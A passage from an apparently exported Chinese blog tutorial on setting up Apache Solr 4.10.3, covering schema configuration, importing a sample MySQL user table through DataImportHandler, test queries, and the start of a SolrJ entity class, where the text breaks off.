Query&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x521A;&#x5F00;&#x59CB;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;Solr&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x4E86;&#x3002;</p>\n<p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8981;&#x5728;&#x4F60;&#x7684;&#x9879;&#x76EE;&#x4E2D;&#x5F15;&#x5165;Solr&#x9700;&#x8981;&#x8003;&#x8651;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;<br>1&#x3001;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x9891;&#x7387;&#xFF1A;&#x6BCF;&#x5929;&#x6570;&#x636E;&#x589E;&#x91CF;&#x6709;&#x591A;&#x5927;&#xFF0C;&#x53CA;&#x65F6;&#x66F4;&#x65B0;&#x8FD8;&#x662F;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;<br>2&#x3001;&#x6570;&#x636E;&#x603B;&#x91CF;&#xFF1A;&#x6570;&#x636E;&#x8981;&#x4FDD;&#x5B58;&#x591A;&#x957F;&#x65F6;&#x95F4;<br>3&#x3001;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#xFF1A;&#x671F;&#x671B;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5185;&#x770B;&#x5230;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x957F;&#x5141;&#x8BB8;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;<br>4&#x3001;&#x6570;&#x636E;&#x7279;&#x70B9;&#xFF1A;&#x6570;&#x636E;&#x6E90;&#x5305;&#x62EC;&#x54EA;&#x4E9B;&#xFF0C;&#x5E73;&#x5747;&#x5355;&#x6761;&#x8BB0;&#x5F55;&#x5927;&#x5C0F;<br>5&#x3001;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#xFF1A;&#x6709;&#x54EA;&#x4E9B;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#xFF0C;&#x68C0;&#x7D22;&#x6761;&#x4EF6;<br>6&#x3001;&#x8D44;&#x6E90;&#x590D;&#x7528;&#xFF1A;&#x5DF2;&#x6709;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x662F;&#x600E;&#x6837;&#x7684;&#xFF0C;&#x662F;&#x5426;&#x6709;&#x5347;&#x7EA7;&#x8BA1;&#x5212;</p>\n","excerpt":"<h3 id=\"&#x73AF;&#x5883;&#x642D;&#x5EFA;\"><a href=\"#&#x73AF;&#x5883;&#x642D;&#x5EFA;\" class=\"headerlink\" title=\"&#x73AF;&#x5883;&#x642D;&#x5EFA;\"></a>&#x73AF;&#x5883;&#x642D;&#x5EFA;</h3><p>1&#x3001;&#x5230;apache&#x4E0B;&#x8F7D;solr&#xFF0C;&#x5730;&#x5740;&#xFF1A;<a href=\"http://mirrors.hust.edu.cn/apache/lucene/solr/\">http://mirrors.hust.edu.cn/apache/lucene/solr/</a><br>2&#x3001;&#x89E3;&#x538B;&#x5230;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;<br>3&#x3001;cd into D:\\Solr\\solr-4.10.3\\example<br>4&#x3001;Execute the server by &#x201C;java -jar startup.jar&#x201D;Solr&#x4F1A;&#x81EA;&#x52A8;&#x8FD0;&#x884C;&#x5728;&#x81EA;&#x5E26;&#x7684;Jetty&#x4E0A;<br>5&#x3001;&#x8BBF;&#x95EE;<a href=\"http://localhost:8983/solr/#/\">http://localhost:8983/solr/#/</a></p>\n<p>PS&#xFF1A;solr-5.0 &#x4EE5;&#x4E0A;&#x9ED8;&#x8BA4;&#x5BF9;schema&#x7684;&#x7BA1;&#x7406;&#x662F;&#x4F7F;&#x7528;managed-schema&#xFF0C;&#x4E0D;&#x80FD;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;Schema Restful&#x7684;API&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x679C;&#x8981;&#x60F3;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x628A;managed-schema&#x62F7;&#x8D1D;&#x4E00;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;schema.xml&#xFF0C;&#x5728;solrconfig.xml&#x4E2D;&#x4FEE;&#x6539;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- &lt;schemaFactory class=<span class=\"string\">&quot;ManagedIndexSchemaFactory&quot;</span>&gt;</span><br><span class=\"line\">    &lt;bool name=<span class=\"string\">&quot;mutable&quot;</span>&gt;<span class=\"literal\">true</span>&lt;/bool&gt;</span><br><span class=\"line\">    &lt;str name=<span class=\"string\">&quot;managedSchemaResourceName&quot;</span>&gt;managed-schema&lt;/str&gt;</span><br><span class=\"line\">  &lt;/schemaFactory&gt; --&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;!-- &lt;processor class=<span class=\"string\">&quot;solr.AddSchemaFieldsUpdateProcessorFactory&quot;</span>&gt;</span><br><span class=\"line\">      &lt;str name=<span class=\"string\">&quot;defaultFieldType&quot;</span>&gt;strings&lt;/str&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Boolean&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;booleans&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.util.Date&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tdates&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Long&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Integer&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tlongs&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">      &lt;lst name=<span class=\"string\">&quot;typeMapping&quot;</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;valueClass&quot;</span>&gt;java.lang.Number&lt;/str&gt;</span><br><span class=\"line\">        &lt;str name=<span class=\"string\">&quot;fieldType&quot;</span>&gt;tdoubles&lt;/str&gt;</span><br><span class=\"line\">      &lt;/lst&gt;</span><br><span class=\"line\">    &lt;/processor&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &lt;schemaFactory class=<span class=\"string\">&quot;ClassicIndexSchemaFactory&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\"><a href=\"#&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;\"></a>&#x521B;&#x5EFA;MySQL&#x6570;&#x636E;</h3><p>DataBase Name: mybatis<br>Table Name: user<br>Db.sql</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET FOREIGN_KEY_CHECKS=0;</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">-- Table structure <span class=\"keyword\">for</span> `user`</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">DROP TABLE IF EXISTS `user`;</span><br><span class=\"line\"></span><br><span class=\"line\">CREATE TABLE `user` (</span><br><span class=\"line\">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">  `userName` varchar(50) DEFAULT NULL,</span><br><span class=\"line\">  `userAge` int(11) DEFAULT NULL,</span><br><span class=\"line\">  `userAddress` varchar(200) DEFAULT NULL,</span><br><span class=\"line\">  PRIMARY KEY (`id`)</span><br><span class=\"line\">) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;</span><br><span class=\"line\"></span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">-- Records of user</span><br><span class=\"line\">-- ----------------------------</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;1&apos;</span>, <span class=\"string\">&apos;summer&apos;</span>, <span class=\"string\">&apos;30&apos;</span>, <span class=\"string\">&apos;shanghai&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;2&apos;</span>, <span class=\"string\">&apos;test1&apos;</span>, <span class=\"string\">&apos;22&apos;</span>, <span class=\"string\">&apos;suzhou&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;3&apos;</span>, <span class=\"string\">&apos;test1&apos;</span>, <span class=\"string\">&apos;29&apos;</span>, <span class=\"string\">&apos;some place&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;4&apos;</span>, <span class=\"string\">&apos;lu&apos;</span>, <span class=\"string\">&apos;28&apos;</span>, <span class=\"string\">&apos;some place&apos;</span>);</span><br><span class=\"line\">INSERT INTO `user` VALUES (<span class=\"string\">&apos;5&apos;</span>, <span class=\"string\">&apos;xiaoxun&apos;</span>, <span class=\"string\">&apos;27&apos;</span>, <span class=\"string\">&apos;nanjing&apos;</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\"><a href=\"#&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;\"></a>&#x4F7F;&#x7528;DataImportHandler&#x5BFC;&#x5165;&#x5E76;&#x7D22;&#x5F15;&#x6570;&#x636E;</h3><p>1&#xFF09; &#x914D;&#x7F6E;D:\\Solr\\solr-4.10.3\\example\\solr\\collection1\\conf\\solrconfig.xml</p>\n<p>&#x5728;<requestHandler name=\"/select\" class=\"solr.SearchHandler\">&#x524D;&#x9762;&#x4E0A;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;dataimport&#x7684;&#x5904;&#x7406;&#x7684;Handler<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;requestHandler name=<span class=\"string\">&quot;/dataimport&quot;</span> class=<span class=\"string\">&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;     &lt;lst name=<span class=\"string\">&quot;defaults&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;        &lt;str name=<span class=\"string\">&quot;config&quot;</span>&gt;data-config.xml&lt;/str&gt;</span><br><span class=\"line\">&#x3000;&#x3000;     &lt;/lst&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/requestHandler&gt;</span><br></pre></td></tr></table></figure></requestHandler></p>\n<p>2&#xFF09; &#x5728;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x6DFB;&#x52A0;data-config.xml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;dataConfig&gt;</span><br><span class=\"line\">    &lt;dataSource <span class=\"built_in\">type</span>=<span class=\"string\">&quot;JdbcDataSource&quot;</span> driver=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span> url=<span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot;</span> user=<span class=\"string\">&quot;root&quot;</span> password=<span class=\"string\">&quot;luxx&quot;</span> batchSize=<span class=\"string\">&quot;-1&quot;</span> /&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;document name=<span class=\"string\">&quot;testDoc&quot;</span>&gt;</span><br><span class=\"line\">        &lt;entity name=<span class=\"string\">&quot;user&quot;</span> pk=<span class=\"string\">&quot;id&quot;</span></span><br><span class=\"line\">                query=<span class=\"string\">&quot;select * from user&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;         &lt;field column=<span class=\"string\">&quot;id&quot;</span> name=<span class=\"string\">&quot;id&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;        &lt;field column=<span class=\"string\">&quot;userName&quot;</span> name=<span class=\"string\">&quot;userName&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAge&quot;</span> name=<span class=\"string\">&quot;userAge&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAddress&quot;</span> name=<span class=\"string\">&quot;userAddress&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;  &lt;/entity&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/document&gt;</span><br><span class=\"line\">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x8BF4;&#x660E;&#xFF1A;<br>dataSource&#x662F;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x6E90;&#x3002;<br>Entity&#x5C31;&#x662F;&#x4E00;&#x5F20;&#x8868;&#x5BF9;&#x5E94;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;pk&#x662F;&#x4E3B;&#x952E;&#xFF0C;query&#x662F;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x3002;<br>Field&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;column&#x662F;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;column&#x540D;&#xFF0C;&#x540E;&#x9762;&#x7684;name&#x5C5E;&#x6027;&#x5BF9;&#x5E94;&#x7740;Solr&#x7684;Filed&#x7684;&#x540D;&#x5B57;&#x3002;</p>\n<p>3&#xFF09; &#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;schema.xml&#xFF0C;&#x8FD9;&#x662F;Solr&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7D22;&#x5F15;&#x7684;&#x6A21;&#x5F0F;<br>&#xFF08;1&#xFF09;&#x4FDD;&#x7559;<em>version</em> &#x8FD9;&#x4E2A;field<br>&#xFF08;2&#xFF09;&#x6DFB;&#x52A0;&#x7D22;&#x5F15;&#x5B57;&#x6BB5;&#xFF1A;&#x8FD9;&#x91CC;&#x6BCF;&#x4E2A;field&#x7684;name&#x8981;&#x548C;data-config.xml&#x91CC;&#x7684;entity&#x7684;field&#x7684;name&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;id&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> required=<span class=\"string\">&quot;true&quot;</span> multiValued=<span class=\"string\">&quot;false&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!--&lt;field name=<span class=\"string\">&quot;id&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> required=<span class=\"string\">&quot;true&quot;</span> multiValued=<span class=\"string\">&quot;false&quot;</span>/&gt; --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userName&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userAge&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;int&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;field name=<span class=\"string\">&quot;userAddress&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>\n<p>&#xFF08;3&#xFF09;&#x5220;&#x9664;&#x591A;&#x4F59;&#x7684;field&#xFF0C;&#x5220;&#x9664;copyField&#x91CC;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FD9;&#x4E9B;&#x7528;&#x4E0D;&#x4E0A;&#x3002;&#x6CE8;&#x610F;&#xFF1A;text&#x8FD9;&#x4E2A;field&#x4E0D;&#x80FD;&#x5220;&#x9664;&#xFF0C;&#x5426;&#x5219;Solr&#x542F;&#x52A8;&#x5931;&#x8D25;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;text&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text_general&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;false&quot;</span> multiValued=<span class=\"string\">&quot;true&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#xFF08;4&#xFF09;&#x8BBE;&#x7F6E;&#x552F;&#x4E00;&#x4E3B;&#x952E;&#xFF1A;<uniqueKey>id</uniqueKey>&#xFF0C;&#x6CE8;&#x610F;&#xFF1A;Solr&#x4E2D;&#x7D22;&#x5F15;&#x7684;&#x4E3B;&#x952E;&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x652F;&#x6301;type=&#x201D;string&#x201D;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x800C;&#x6211;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;id&#x662F;int&#x578B;&#x7684;&#xFF0C;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x4FEE;&#x6539;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x7684;elevate.xml&#xFF0C;&#x6CE8;&#x91CA;&#x6389;&#x4E0B;&#x9762;2&#x884C;&#xFF0C;&#x8FD9;&#x8C8C;&#x4F3C;&#x662F;Solr&#x7684;Bug&#xFF0C;&#x539F;&#x56E0;&#x4E0D;&#x660E;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;doc id=<span class=\"string\">&quot;MA147LL/A&quot;</span> /&gt;</span><br><span class=\"line\">&lt;doc id=<span class=\"string\">&quot;IW-02&quot;</span> exclude=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>4&#xFF09;&#x62F7;&#x8D1D;mysql-connector-java-5.1.22-bin.jar&#x548C;solr-dataimporthandler-4.10.3.jar&#x5230;D:\\Solr\\solr-4.10.3\\example\\solr-webapp\\webapp\\WEB-INF\\lib&#x3002;&#x4E00;&#x4E2A;&#x662F;mysql&#x7684;java&#x9A71;&#x52A8;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x5728;D:\\Solr\\solr-4.10.3\\dist&#x76EE;&#x5F55;&#x91CC;&#xFF0C;&#x662F;org.apache.solr.handler.dataimport.DataImportHandler&#x6240;&#x5728;&#x7684;jar&#x3002;</p>\n<p>&#x91CD;&#x542F;Solr&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6B63;&#x786E;&#x5C31;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3002;</p>\n<p>solrconfig.xml&#x662F;solr&#x7684;&#x57FA;&#x7840;&#x6587;&#x4EF6;&#xFF0C;&#x91CC;&#x9762;&#x914D;&#x7F6E;&#x4E86;&#x5404;&#x79CD;web&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x5668;&#x3001;&#x8BF7;&#x6C42;&#x54CD;&#x5E94;&#x5904;&#x7406;&#x5668;&#x3001;&#x65E5;&#x5FD7;&#x3001;&#x7F13;&#x5B58;&#x7B49;&#x3002;<br>schema.xml&#x914D;&#x7F6E;&#x6620;&#x5C04;&#x4E86;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#x3002;&#x5206;&#x8BCD;&#x5668;&#x7684;&#x914D;&#x7F6E;&#x3001;&#x7D22;&#x5F15;&#x6587;&#x6863;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x5B57;&#x6BB5;&#x4E5F;&#x5728;&#x6B64;&#x914D;&#x7F6E;&#x3002;</p>\n<h3 id=\"&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\"><a href=\"#&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\" class=\"headerlink\" title=\"&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;\"></a>&#x7D22;&#x5F15;&#x6D4B;&#x8BD5;</h3><p>&#x8FDB;&#x5165;Solr&#x4E3B;&#x9875;&#xFF0C;&#x5728;Core Selector&#x4E2D;&#x9009;&#x62E9;collection1&#xFF1A;<a href=\"http://localhost:8983/solr/#/collection1\">http://localhost:8983/solr/#/collection1</a></p>\n<p>&#x70B9;&#x51FB;Dataimport&#xFF0C;Command&#x9009;&#x62E9;full-import&#xFF08;&#x9ED8;&#x8BA4;&#xFF09;&#xFF0C;&#x70B9;&#x51FB;&#x201C;Execute&#x201D;&#xFF0C;Refresh Status&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#xFF1A;<br>Indexing completed. Added/Updated: 7 documents.Deleted 0 documents.<br>Requests: 1, Fetched: 7, Skipped: 0, Processed: 7<br>Started: 8 minutes ago</p>\n<p>Query&#x6D4B;&#x8BD5;&#xFF1A;&#x5728;q&#x4E2D;&#x8F93;&#x5165;userName:test1&#x8FDB;&#x884C;&#x68C0;&#x7D22;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7ED3;&#x679C;&#x3002;<br>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;full-import&#x7D22;&#x5F15;&#x4E86;&#x914D;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<h3 id=\"&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\"><a href=\"#&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;\"></a>&#x4F7F;&#x7528;Solrj&#x7D22;&#x5F15;&#x5E76;&#x68C0;&#x7D22;&#x6570;&#x636E;</h3><p>&#x4E0A;&#x9762;&#x662F;&#x4F7F;&#x7528;Solr Admin&#x9875;&#x9762;&#x4E0A;&#x7684;&#x529F;&#x80FD;&#x6D4B;&#x8BD5;&#x7D22;&#x5F15;&#x548C;&#x68C0;&#x7D22;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#x6765;&#x64CD;&#x4F5C;Solr&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x5728;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;User&#x7C7B;&#x5B9E;&#x4F53;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x67E5;&#x627E;&#x6240;&#x6709;&#x7684;index&#x6765;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x3002;</p>\n<p>User&#x5B9E;&#x4F53;&#x7C7B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.mybatis.test.model;</span><br><span class=\"line\"></span><br><span class=\"line\">import 